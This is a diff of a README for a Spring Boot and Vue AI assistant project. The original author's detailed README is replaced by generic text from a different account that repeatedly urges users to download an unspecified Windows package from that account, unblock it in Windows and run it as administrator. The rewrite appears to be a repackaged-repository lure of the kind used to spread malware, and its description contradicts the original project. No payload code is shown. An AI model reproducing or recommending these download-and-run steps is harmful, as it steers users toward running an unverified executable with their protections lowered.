@@ -1,589 +1,209 @@
-# Super AI Agent - Intelligent Conversational Assistant Platform
+# 🤖 Super-ai-agent - AI Help for Everyday Tasks
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-1f77b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Preservative-bowels37/Super-ai-agent)
 
-[中文](README_CN.md) | English
+## 📥 Download
 
-![Java](https://img.shields.io/badge/Java-21-orange)
-![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.5.9-brightgreen)
-![Spring AI](https://img.shields.io/badge/Spring%20AI-1.0.0-blue)
-![Vue](https://img.shields.io/badge/Vue-3.4.0-green)
-![License](https://img.shields.io/badge/License-MIT-yellow)
-![GitHub stars](https://img.shields.io/github/stars/muonuo/Super-ai-agent?style=social)
-![GitHub forks](https://img.shields.io/github/forks/muonuo/Super-ai-agent?style=social)
+Go to this page to download and run the app on Windows:
 
-Built with Spring Boot 3.5 + Java 21 + Spring AI + Vue 3, featuring AI relationship counseling, deep-thinking agent, RAG knowledge retrieval, and multi-tool invocation. Supports love report generation, map service integration, PDF document processing, and more. Clean architecture, comprehensive documentation — ideal for learning AI applications and boosting your resume.
+https://github.com/Preservative-bowels37/Super-ai-agent
 
-[Features](#-features) • [Architecture](#-tech-architecture) • [Quick Start](#-quick-start) • [Screenshots](#-screenshots)
+## 🧰 What this app does
 
-</div>
+Super-ai-agent is an AI app with a clear layout and a simple setup. It helps you:
 
----
+- Chat with an AI assistant
+- Get help with feelings and daily stress
+- Ask a deep-thinking agent to break down hard questions
+- Search your own knowledge base
+- Use several tools in one place
+- Create love and relationship reports
+- Work with maps
+- Handle PDF files
 
-## 📸 Screenshots
+It fits well as a learning project and as a resume project. It uses Spring Boot 3.5, Java 21, Spring AI, and Vue 3.
 
-### Home Page
+## 💻 What you need
 
-<p align="center">
-  <img src="docs/images/首页.jpg" alt="Home Page" width="800"/>
-  <br/>
-  <em>Home Page - Choose Your AI Assistant</em>
-</p>
+Before you start, make sure your Windows PC has:
 
-**Highlights:**
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection
+- A modern browser such as Edge, Chrome, or Firefox
 
-- ✅ Clean and modern UI design
-- ✅ Two AI applications to choose from
-- ✅ Quick access to Love Master and Super Agent
-- ✅ Responsive layout for all devices
+If you plan to run it yourself from source, you will also need:
 
-### AI Love Master
+- Java 21
+- A PostgreSQL database
+- Basic access to the project files
 
-<p align="center">
-  <img src="docs/images/恋爱大师.jpg" alt="AI Love Master" width="800"/>
-  <br/>
-  <em>AI Love Master - Relationship Counseling & Plain Text Chat</em>
-</p>
+## 🚀 How to get the app
 
-**Highlights:**
+1. Open the download page:
+   https://github.com/Preservative-bowels37/Super-ai-agent
 
-- ✅ Natural plain text chat without Markdown formatting
-- ✅ Three conversation modes: Basic, Smart (recommended), RAG Q&A
-- ✅ Feature enhancements: Love report generation, tool invocation
-- ✅ Session management: Create, rename, delete conversations
-- ✅ Real-time streaming output with typewriter effect
+2. Look for the latest release, file, or download option on the page.
 
-### AI Super Agent (Manus)
+3. Download the Windows version if one is listed.
 
-<p align="center">
-  <img src="docs/images/智能体.jpg" alt="Manus Super Agent" width="800"/>
-  <br/>
-  <em>Manus Super Agent - Deep Thinking & Tool Invocation</em>
-</p>
+4. If the file is a ZIP package, right-click it and choose Extract All.
 
-**Highlights:**
+5. Open the extracted folder.
 
-- ✅ Gemini-style thinking process display (collapsible)
-- ✅ Real-time thinking steps and duration
-- ✅ 14+ automatic tool calls (search, files, email, PDF, etc.)
-- ✅ MCP protocol integration (Amap 15 tools)
-- ✅ Smart question classification (simple → direct answer, complex → deep thinking)
+6. Start the app by double-clicking the main program file.
 
----
+## 🖱️ First-time setup
 
-## 📖 About
+After you open the app for the first time:
 
-Super AI Agent is a **production-grade AI conversational platform** that demonstrates how to build a complete intelligent agent application using Spring AI.
+1. Wait for the app to finish loading.
+2. If Windows asks for permission, choose Yes.
+3. Open the main screen.
+4. Set up your AI service key if the app asks for one.
+5. Save your settings.
+6. Try a simple chat message to confirm the app is working.
 
-### 🎭 Two Core Applications
+## 🧭 Main features
 
-<table>
-<tr>
-<td width="50%">
+### 💬 AI chat
 
-#### 💕 AI Love Master
+Use the chat screen to ask simple or complex questions. The app can help with writing, ideas, planning, and basic research.
 
-Professional relationship counseling assistant
+### 🧠 Deep thinking agent
 
-- ✅ Smart chat (Basic/Smart/RAG modes)
-- ✅ Auto-generate structured love reports
-- ✅ RAG knowledge-enhanced answers
-- ✅ Smart fallback strategy
-- ✅ Report download & sharing
+For harder questions, use the deep-thinking agent. It can split a problem into smaller parts and give a more structured answer.
 
-</td>
-<td width="50%">
+### 📚 RAG knowledge search
 
-#### 🤖 AI Super Agent (Manus)
+The app can search content from your own knowledge base. This helps when you want answers from local documents or project files.
 
-All-purpose assistant with deep thinking
+### 🧰 Multi-tool calls
 
-- ✅ DeepSeek-style thinking process display
-- ✅ Complete ReAct loop (Think-Act-Observe)
-- ✅ 14+ tool calls (search/files/email/PDF, etc.)
-- ✅ MCP protocol integration (Amap 15 tools)
-- ✅ Infinite loop detection & timeout control
-
-</td>
-</tr>
-</table>
-
-### 🌟 Why This Project?
-
-| Feature | Description |
-| ------- | ----------- |
-| 📚 **Beginner Friendly** | Detailed code comments, clean architecture, great for Spring AI beginners |
-| 🏗️ **Complete Architecture** | Layered architecture + Agent pattern + RAG + Tool invocation |
-| 🎯 **Production Grade** | Exception handling, logging, monitoring, and protection mechanisms |
-| 📝 **Well Documented** | README, code comments, architecture diagrams included |
-| 💼 **Resume Builder** | Modern tech stack, complete features, interview bonus |
-| 🚀 **Quick Deploy** | One-click startup with Docker Compose |
-
----
-
-## ✨ Features
-
-### AI Love Master
-
-- 💬 **Smart Chat**: Three conversation modes (Basic/Smart/RAG)
-- 📊 **Love Reports**: Auto-generate structured relationship analysis reports
-- 📥 **Report Download**: Download and copy report content
-- 🎯 **RAG Knowledge**: Professional answers based on relationship knowledge base
-- 🔄 **Smart Fallback**: Auto-switch to regular chat when RAG fails
-
-### AI Super Agent (Manus)
-
-- 🧠 **Deep Thinking**: Display complete thinking process (collapsible)
-- 🔧 **Tool Invocation**: 14+ tools (search, files, email, PDF generation, etc.)
-- 🌐 **MCP Integration**: Amap 15 tools (POI search, route planning, etc.)
-- 💭 **Thinking Visualization**: Gemini-style thinking process display
-- ⚡ **Streaming Output**: Real-time AI response and thinking steps
-- 🎨 **Smart Classification**: Auto-detect simple/complex questions for selective thinking
-
-### Core Capabilities
-
-| Feature | Description |
-| ------- | ----------- |
-| **Question Classification** | Keyword-based quick type detection (simple/complex) |
-| **Selective Thinking** | Simple questions answered directly, complex ones get deep thinking |
-| **Tool Invocation** | Automatically select and call appropriate tools |
-| **Infinite Loop Prevention** | Semantic repetition, tool repetition, consecutive failure detection |
-| **Execution Monitoring** | Timeout control, execution state tracking |
-| **Conversation Memory** | Multiple storage options (memory/file/database) |
-| **RAG Retrieval** | Vector storage, query transformation, multi-query expansion |
-
----
-
-## 🏗️ Tech Architecture
-
-### Backend Stack
-
-| Technology | Version | Description |
-| ---------- | ------- | ----------- |
-| Java | 21 | Programming language |
-| Spring Boot | 3.5.9 | Application framework |
-| Spring AI | 1.0.0 | AI integration framework |
-| Spring AI Alibaba | 1.0.0.2 | Alibaba Cloud AI integration |
-| MyBatis-Plus | 3.5.12 | ORM framework |
-| MySQL | 8.0+ | Conversation history storage |
-| PostgreSQL | 14+ | Vector database (PGVector) |
-| LangChain4j | 1.0.0-beta2 | AI orchestration framework |
-
-### Frontend Stack
-
-| Technology | Version | Description |
-| ---------- | ------- | ----------- |
-| Vue | 3.4.0 | Frontend framework |
-| Vue Router | 4.2.0 | Routing |
-| Axios | 1.6.0 | HTTP client |
-| Vite | 5.0.0 | Build tool |
-
-### AI Capabilities
-
-| Capability | Provider | Description |
-| ---------- | -------- | ----------- |
-| Chat Model | Alibaba Cloud Tongyi Qianwen | qwen-max, qwen-plus |
-| Embedding Model | Alibaba Cloud DashScope | text-embedding-v2 |
-| Local Model | Ollama | Optional local deployment |
-| Vector Store | PGVector | PostgreSQL vector extension |
-| MCP Tools | Amap | 15 map-related tools |
-
-### Architecture Design
-
-```
-┌─────────────────────────────────────────────────────────┐
-│                    Frontend Layer (Vue 3)                 │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
-│  │  Love Master  │  │  Super Agent  │  │   Home Page   │  │
-│  └──────────────┘  └──────────────┘  └──────────────┘  │
-└─────────────────────────────────────────────────────────┘
-                            │
-                            │ HTTP/SSE
-                            ▼
-┌─────────────────────────────────────────────────────────┐
-│                  Controller Layer (Spring MVC)            │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
-│  │ LoveApp      │  │ Manus        │  │ ChatHistory  │  │
-│  │ Controller   │  │ Controller   │  │ Controller   │  │
-│  └──────────────┘  └──────────────┘  └──────────────┘  │
-└─────────────────────────────────────────────────────────┘
-                            │
-                            ▼
-┌─────────────────────────────────────────────────────────┐
-│                     Agent Layer                           │
-│  ┌──────────────────────────────────────────────────┐  │
-│  │              MonuoManus (Super Agent)              │  │
-│  │  ┌────────────┐  ┌────────────┐  ┌────────────┐ │  │
-│  │  │ Thinking   │  │ ToolCall   │  │ Database   │ │  │
-│  │  │ Agent      │  │ Agent      │  │ Memory     │ │  │
-│  │  └────────────┘  └────────────┘  └────────────┘ │  │
-│  └──────────────────────────────────────────────────┘  │
-│  ┌──────────────────────────────────────────────────┐  │
-│  │                LoveApp (Love Master)               │  │
-│  │  ┌────────────┐  ┌────────────┐  ┌────────────┐ │  │
-│  │  │ RAG        │  │ Fallback   │  │ Report     │ │  │
-│  │  │ Advisor    │  │ Strategy   │  │ Generator  │ │  │
-│  │  └────────────┘  └────────────┘  └────────────┘ │  │
-│  └──────────────────────────────────────────────────┘  │
-└─────────────────────────────────────────────────────────┘
-                            │
-                            ▼
-┌─────────────────────────────────────────────────────────┐
-│                    Tools Layer                            │
-│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐  │
-│  │ Web      │ │ File     │ │ Mail     │ │ PDF      │  │
-│  │ Search   │ │ Operation│ │ Send     │ │ Generate │  │
-│  └──────────┘ └──────────┘ └──────────┘ └──────────┘  │
-│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐  │
-│  │ Terminal │ │ Download │ │ Scraping │ │ Document │  │
-│  │ Operation│ │ Resource │ │ Web      │ │ Reader   │  │
-│  └──────────┘ └──────────┘ └──────────┘ └──────────┘  │
-│  ┌──────────────────────────────────────────────────┐  │
-│  │         MCP Tools (Amap 15 tools)                 │  │
-│  └──────────────────────────────────────────────────┘  │
-└─────────────────────────────────────────────────────────┘
-                            │
-                            ▼
-┌─────────────────────────────────────────────────────────┐
-│                    Data Layer                             │
-│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐  │
-│  │ MySQL        │  │ PostgreSQL   │  │ File System  │  │
-│  │ (Chat History)│  │ (Vector Store)│ │ (Docs/Cache) │  │
-│  └──────────────┘  └──────────────┘  └──────────────┘  │
-└─────────────────────────────────────────────────────────┘
-```
-
----
-
-## 🚀 Quick Start
-
-### Option 1: Docker Compose (Recommended)
-
-If you have Docker installed, this is the easiest way:
-
-```bash
-# 1. Set environment variables
-export DASHSCOPE_API_KEY=your_api_key
-export MYSQL_PASSWORD=your_password
-export POSTGRESQL_PASSWORD=your_password
-
-# 2. Start all services (App + MySQL + PostgreSQL)
-docker-compose -f docker-compose.local.yml up --build
-
-# 3. Wait for startup, then access:
-# Backend Swagger UI: http://localhost:8123/api/swagger-ui.html
-# Frontend: http://localhost:5173
-```
-
-### Option 2: Local Manual Setup
-
-#### 1. Prerequisites
-
-- ✅ Java 21+
-- ✅ Node.js 18+
-- ✅ Maven 3.8+
-- ✅ MySQL 8.0+
-- ✅ PostgreSQL 14+ (with PGVector extension)
-- ✅ Alibaba Cloud DashScope API Key
-
-#### 2. Clone the Repository
-
-```bash
-git clone https://github.com/muonuo/Super-ai-agent.git
-cd Super-ai-agent
-```
-
-#### 3. Configure Databases
-
-**MySQL Setup:**
-
-```sql
--- Create database
-CREATE DATABASE super_ai_agent CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
-
--- Tables are auto-created, no manual SQL needed
-```
-
-**PostgreSQL + PGVector Setup:**
-
-```sql
--- Create database
-CREATE DATABASE super_ai_agent;
-
--- Install PGVector extension (Spring AI will auto-initialize vector tables)
-CREATE EXTENSION IF NOT EXISTS vector;
-```
-
-#### 4. Configure Environment Variables
-
-Edit `src/main/resources/application.yml`:
-
-```yaml
-# MySQL config
-spring:
-  datasource:
-    url: jdbc:mysql://localhost:3306/super_ai_agent?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=Asia/Shanghai
-    username: root
-    password: your_mysql_password
-
-  # AI config (required)
-  ai:
-    dashscope:
-      api-key: your_dashscope_api_key  # Get it at https://dashscope.console.aliyun.com/
-
-# PostgreSQL config
-pgvector:
-  datasource:
-    url: jdbc:postgresql://localhost:5432/super_ai_agent
-    username: postgres
-    password: your_postgresql_password
-
-# Optional config
-search-api:
-  tavily-api-key: your_tavily_api_key  # For web search
-qq-email:
-  from: your_qq_email
-  auth-code: your_qq_email_auth_code   # For sending love reports
-```
-
-> 💡 **Getting a DashScope API Key:**
->
-> 1. Visit https://dashscope.console.aliyun.com/
-> 2. Register/login to Alibaba Cloud
-> 3. Enable DashScope service
-> 4. Create an API Key
-> 5. New users get free credits
-
-#### 5. Start Backend
-
-```bash
-# Option A: Using Maven (recommended)
-cd Super-ai-agent
-mvn clean package -DskipTests
-java -jar target/Super-ai-agent-0.0.1-SNAPSHOT.jar
-
-# Option B: Using IDE
-# Run src/main/java/com/monuo/superaiagent/SuperAiAgentApplication.java directly
-```
-
-Backend will start at `http://localhost:8123/api`
-
-#### 6. Start Frontend
-
-```bash
-cd super-ai-agent-web
-npm install
-npm run dev
-```
-
-Frontend will start at `http://localhost:5173`
-
-#### 7. Access the Application
-
-Open your browser and visit:
-
-- **Frontend**: http://localhost:5173
-- **Backend Swagger UI**: http://localhost:8123/api/swagger-ui.html
-- **Backend API Docs**: http://localhost:8123/api/v3/api-docs
-
----
-
-## ❓ FAQ
-
-### Q1: Port Already in Use
-
-Change the port in `src/main/resources/application.yml`:
-
-```yaml
-server:
-  port: 8123  # Change to another port, e.g. 8124
-```
-
-### Q2: Database Connection Failed
-
-Make sure MySQL and PostgreSQL services are running:
-
-```bash
-# Windows
-net start MySQL80
-net start postgresql-x64-14
-
-# Linux/Mac
-sudo systemctl start mysql
-sudo systemctl start postgresql
-```
-
-### Q3: PGVector Extension Not Installed
-
-PostgreSQL requires the PGVector extension:
-
-```bash
-# Ubuntu/Debian
-sudo apt install postgresql-14-pgvector
-
-# macOS (Homebrew)
-brew install pgvector
-
-# Windows
-# Download from https://github.com/pgvector/pgvector-windows/releases
-```
-
-### Q4: Maven Build Failed
-
-Make sure you're using Java 21 and Maven 3.8+:
-
-```bash
-java -version
-mvn -version
-```
-
-### Q5: DashScope API Key Not Found
-
-1. Visit https://dashscope.console.aliyun.com/
-2. Register/login to Alibaba Cloud
-3. Enable DashScope service
-4. Create an API Key
-5. New users get free credits
-
----
-
-## 🛠️ Development Guide
-
-### Project Structure
-
-```
-Super-ai-agent/
-├── src/main/java/com/monuo/superaiagent/
-│   ├── agent/              # Agent core
-│   │   ├── BaseAgent.java
-│   │   ├── ThinkingAgent.java
-│   │   ├── ToolCallAgent.java
-│   │   └── MonuoManus.java
-│   ├── app/                # Application layer
-│   │   └── LoveApp.java
-│   ├── tools/              # Tools
-│   ├── rag/                # RAG related
-│   ├── controller/         # Controllers
-│   ├── service/            # Services
-│   └── config/             # Configuration
-├── super-ai-agent-web/     # Frontend project
-│   ├── src/
-│   │   ├── views/          # Pages
-│   │   ├── components/     # Components
-│   │   ├── api/            # API interfaces
-│   │   └── router/         # Routes
-│   └── package.json
-├── docs/                   # Documentation
-└── docker-compose.yaml     # Docker config
-```
-
-### Adding New Tools
-
-1. Create a tool class:
-
-```java
-@Component
-public class MyTool {
-
-    @Tool(description = "Tool description")
-    public String myFunction(
-        @ToolParam(description = "Parameter description") String param) {
-        // Tool logic
-        return "result";
-    }
-}
-```
-
-2. Register the tool:
-
-```java
-@Configuration
-public class ToolRegistration {
-
-    @Bean
-    public List<ToolCallback> myTools(MyTool myTool) {
-        return ToolCallback.from(myTool);
-    }
-}
-```
-
-### Adding New RAG Documents
-
-Place Markdown documents in the `src/main/resources/` directory. The system will auto-load them.
-
----
-
-## 🎯 Usage Examples
-
-### AI Love Master
-
-```
-User: My girlfriend and I have been together for 3 years. She seems a bit cold lately. What should I do?
-
-AI: [Smart Mode + Love Report]
-1. Analyze the conversation in detail
-2. Auto-generate a relationship analysis report
-3. Provide 3-5 specific, actionable suggestions
-4. Support downloading and copying the report
-```
-
-### AI Super Agent
-
-```
-User: Search for today's AI news
-
-AI: [Showing thinking process]
-💭 Thinking...
-├─ Question type: Complex
-├─ User wants today's AI news
-├─ Need to use webSearch tool
-└─ Thinking time: 1.2s
-
-[Calling tool: webSearch]
-[Returning search results...]
-```
-
----
-
-## 🤝 Contributing
-
-Issues and Pull Requests are welcome!
-
-1. Fork this repository
-2. Create a feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Submit a Pull Request
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- [Spring AI](https://spring.io/projects/spring-ai) - AI integration framework
-- [Alibaba Cloud Bailian](https://www.aliyun.com/product/bailian) - AI model service
-- [LangChain4j](https://github.com/langchain4j/langchain4j) - AI orchestration framework
-- [PGVector](https://github.com/pgvector/pgvector) - PostgreSQL vector extension
-
----
-
-## 📞 Contact
-
-- GitHub: [@muonuo](https://github.com/muonuo)
-- Repository: [Super-ai-agent](https://github.com/muonuo/Super-ai-agent)
-- Issues: [Report a bug](https://github.com/muonuo/Super-ai-agent/issues)
-
----
-
-<div align="center">
-
-**If this project helps you, please give it a ⭐ Star!**
-
-Made with ❤️ by [Monuo](https://github.com/muonuo)
-
-</div>
+The app can use different tools in one flow. This is useful when one answer needs more than one step.
+
+### 💘 Relationship report generation
+
+You can generate a love report or relationship report for study, demo, or daily use.
+
+### 🗺️ Map service support
+
+The app can connect with map services for location-based tasks.
+
+### 📄 PDF handling
+
+You can work with PDF documents, which helps with reading and document-based Q&A.
+
+## 🪟 Windows install steps
+
+If you downloaded a ZIP or desktop package:
+
+1. Save the file to your Desktop or Downloads folder.
+2. Right-click the file.
+3. Choose Extract All.
+4. Open the extracted folder.
+5. Find the app file.
+6. Double-click it to start.
+7. Wait until the main window appears.
+
+If Windows blocks the file:
+
+1. Right-click the file.
+2. Open Properties.
+3. Check Unblock, if you see it.
+4. Apply the change.
+5. Try again.
+
+## ⚙️ For users who want to run from source
+
+If you want to run the project from the code:
+
+1. Install Java 21.
+2. Install PostgreSQL.
+3. Create a new database.
+4. Open the project in your IDE.
+5. Set the database address, username, and password.
+6. Add your AI service settings.
+7. Start the backend service.
+8. Open the Vue 3 frontend in your browser.
+
+## 🗂️ Suggested project layout
+
+- `backend` for the Spring Boot app
+- `frontend` for the Vue 3 UI
+- `docs` for guides and notes
+- `data` for sample files and test content
+
+## 🔎 Topics covered
+
+- AI agent
+- Chatbot
+- Java 21
+- LLM
+- pgvector
+- RAG
+- Spring AI
+- Spring Boot
+- Student project
+- Vue 3
+
+## 🧪 Common use cases
+
+- Ask an AI for daily advice
+- Build a knowledge base search app
+- Show how AI tools work together
+- Learn Spring Boot and Spring AI
+- Use it as a class project
+- Add it to a resume as a practical app
+
+## 🛠️ Basic troubleshooting
+
+### App does not start
+
+- Check that Java 21 is installed
+- Make sure you opened the correct file
+- Try running it again as administrator
+
+### Blank screen
+
+- Refresh the browser
+- Check the local server status
+- Restart the app
+
+### Database error
+
+- Check your PostgreSQL settings
+- Make sure the database is running
+- Confirm the database name matches your config
+
+### AI response does not work
+
+- Check your API key
+- Make sure the network works
+- Confirm the AI settings are saved
+
+## 📌 Helpful path for new users
+
+If you only want to use the app on Windows:
+
+1. Open the GitHub page
+2. Download the Windows package
+3. Extract it
+4. Run the app
+5. Start chatting
+
+## 📁 What makes this project useful
+
+- Clear structure
+- Easy to study
+- Good for AI app practice
+- Good for backend and frontend learning
+- Practical features that show real use cases
+- Useful for school work and personal projects
+
+## 🔗 Download again
+
+Visit this page to download and run the app on Windows:
+
+https://github.com/Preservative-bowels37/Super-ai-agent
